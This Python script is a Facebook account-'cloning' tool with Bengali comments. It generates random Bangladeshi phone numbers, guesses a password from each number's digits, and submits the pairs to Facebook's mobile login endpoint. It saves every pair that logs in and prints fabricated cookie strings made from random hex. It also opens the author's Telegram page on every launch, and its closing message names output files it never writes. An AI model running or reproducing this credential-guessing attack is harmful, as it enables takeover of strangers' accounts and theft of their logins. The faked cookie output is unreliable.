import os, time, sys, uuid, random, requests

# ANSI কালার কোড
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
W = '\033[1;37m' # White

def banner():
    os.system('clear')
    # আপনার টেলিগ্রাম লিঙ্কে নিয়ে যাবে
    os.system('xdg-open https://t.me/md_malek')
    
    print(f"""
{R}                ███    ███  ███████  ████████  █████  
{G}                ████  ████  ██          ██    ██   ██ 
{Y}                ██ ████ ██  █████       ██    ███████ 
{B}                ██  ██  ██  ██          ██    ██   ██ 
{P}                ██      ██  ███████     ██    ██   ██ 
    """)

    line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
    print(line)
    print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
    print(f'| [✓] TEAM         : CYBER STRIKER TEAM        |')
    print(f'| [✓] TOOL STATUS  : REAL CLONING (META)       |')
    print(f'| [✓] TELEGRAM     : @md_malek                 |')
    print(f'| [✓] GITHUB       : MR-MALAK                  |')
    print(f'| [✓] TOOL VIRSION : MAX PRO                   |')
    print(line)

def main():
    banner()
    print(f'{R}[•] {G}SALAMU ALAIKUM...................{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{R}[•] {G}CYBER STRIKER TEAM................{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{G}[1] NUMBER COOKIE CLONING')
    print(f'[0] EXIT')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    
    choose = input(f'{R}[▼] {G}CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    elif choose == '0':
        sys.exit()
    else:
        main()

def cloning_start():
    # ইনপুট সেকশন (আপনার স্ক্রিনশট অনুযায়ী)
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{R}[•] {G}BD CODE- -> 016 017 018 019{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    code = input(f'{G}[+] ENTER SIM CODE: {W}')
    
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{R}[•] {G}EXAMPLE : [ 10000, 20000, 50000 ]{W}')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    
    os.system('clear')
    banner()
    print(f'{G}[+]  TARGET DOMAIN: RANDOM CLONING')
    print(f'[+]  TOTAL IDS: {limit}')
    print(f'[+]  PROCESS STARTED')
    print(f'[+]  PLEASE WAIT')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    ok = 0
    for i in range(limit):
        loop = i + 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        pws = uid[5:] # আপনার রিয়েল এপিআই এর ৫ সংখ্যার পাসওয়ার্ড লজিক

        headers = {
            'authority': 'touch.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
        }

        data = {'email': uid, 'pass': pws}
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()

        try:
            response = requests.post(url, headers=headers, data=data, timeout=5)
            
            if "c_user" in response.cookies.get_dict():
                ok += 1
                datr = uuid.uuid4().hex[:24]
                sb = uuid.uuid4().hex[:24]
                xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
                fr = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:20]}.AAA.0.0"
                
                print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
                print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
                
                with open('/sdcard/MALEK-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pws}\n')
        except:
            pass

    print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{G}[+] CRACK PROCESS COMPLETED')
    print(f'[+] IDS SAVED IN ok.txt,cp.txt')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    input(f'\n{G} [ BACK ]{W}')
    main()

if __name__ == "__main__":
    main()
